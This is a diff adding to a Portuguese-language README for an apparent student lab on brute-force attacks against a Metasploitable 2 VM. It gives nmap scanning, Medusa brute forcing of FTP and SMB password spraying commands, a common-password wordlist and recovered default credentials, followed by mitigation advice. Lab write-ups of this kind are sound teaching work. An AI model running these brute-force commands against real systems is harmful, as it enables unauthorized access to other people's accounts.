@@ -33,4 +33,152 @@ O objetivo é simular cenários de auditoria de segurança, entender como funcio
 Utilizado **VirtualBox** para criação das máquinas virtuais.
 
 ### Configuração de Rede
-Tipo de rede:
+
+IPs utilizados no laboratório:
+
+192.168.56.101
+Kali Linux
+
+192.168.56.102
+Metasploitable 2
+
+
+---
+
+# 🔎 Reconhecimento da Rede
+
+Antes da execução dos ataques foi realizado um **scan de portas e serviços** utilizando o Nmap.
+
+### Comando utilizado
+
+```bash
+nmap -sV 192.168.56.102
+
+Serviços encontrados
+
+FTP (porta 21)
+
+SSH (porta 22)
+
+HTTP (porta 80)
+
+SMB (porta 445)
+
+
+Ataque de Força Bruta em FTP
+
+Medusa
+medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
+
+Resultado
+
+login: msfadmin
+senha: msfadmin
+
+Teste de acesso
+ftp 192.168.56.102
+
+🌐 Ataque em Formulário Web (DVWA)
+
+O DVWA foi utilizado para simular ataques em formulário de login web.
+
+URL utilizada:
+
+http://192.168.56.102/dvwa
+
+Modo de segurança configurado:
+
+Low
+
+Foi realizada automação de tentativas de login utilizando wordlists.
+
+🔑 Password Spraying em SMB
+
+Também foi realizado um teste de password spraying em SMB.
+
+Comando utilizado
+medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M smbnt
+
+Esse método testa uma senha comum em vários usuários, evitando bloqueio rápido de contas.
+
+📂 Wordlist Utilizada
+
+Exemplo de wordlist:
+
+123456
+password
+admin
+root
+msfadmin
+toor
+
+Arquivo:
+
+wordlist.txt
+🛡️ Medidas de Mitigação
+
+Para evitar ataques de força bruta recomenda-se:
+
+Política de senha forte
+
+mínimo 12 caracteres
+
+combinação de letras, números e símbolos
+
+Limite de tentativas de login
+
+Bloquear acesso após várias tentativas incorretas.
+
+Autenticação multifator (MFA)
+
+Adicionar camada extra de autenticação.
+
+Monitoramento de logs
+
+Analisar logs de acesso para identificar tentativas suspeitas.
+
+Desativar serviços desnecessários
+
+Reduz a superfície de ataque.
+
+📸 Evidências
+
+Capturas de tela disponíveis na pasta:
+
+/images
+
+Exemplos:
+
+Scan do Nmap
+
+Execução do Medusa
+
+Login FTP bem sucedido
+
+🧰 Ferramentas Utilizadas
+
+Kali Linux
+
+Medusa
+
+Metasploitable 2
+
+DVWA
+
+Nmap
+
+VirtualBox
+
+📖 Conclusão
+
+Este laboratório demonstrou na prática como ataques de força bruta podem comprometer sistemas com credenciais fracas.
+
+Também evidenciou a importância de:
+
+boas políticas de senha
+
+monitoramento de acesso
+
+utilização de múltiplos fatores de autenticação
+
+A segurança ofensiva é fundamental para melhorar as defesas de sistemas.
